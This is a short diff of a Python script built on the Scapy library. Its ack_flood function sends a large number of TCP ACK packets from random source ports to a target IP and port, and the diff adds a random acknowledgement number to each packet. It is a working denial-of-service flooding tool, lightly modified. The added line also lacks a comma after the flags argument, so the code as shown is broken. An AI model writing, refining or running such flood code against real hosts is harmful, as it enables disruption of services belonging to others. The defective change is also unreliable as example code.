@@ -32,14 +32,16 @@ def ack_flood(dest_ip):
 
     print("Starting ACK flood to {}:{} ({} packets)".format(
         dest_ip, DEST_PORT, PACKET_COUNT))
-
+   
     for i in range(PACKET_COUNT):
         src_port = random.randint(1024, 65535)
 
+        ack_num = random.randint(1, 4294967295)
         pkt = IP(dst=dest_ip) / TCP(
             sport=src_port,
             dport=DEST_PORT,
             flags="A"
+            ack=ack_num
         )
 
         send(pkt, verbose=False)
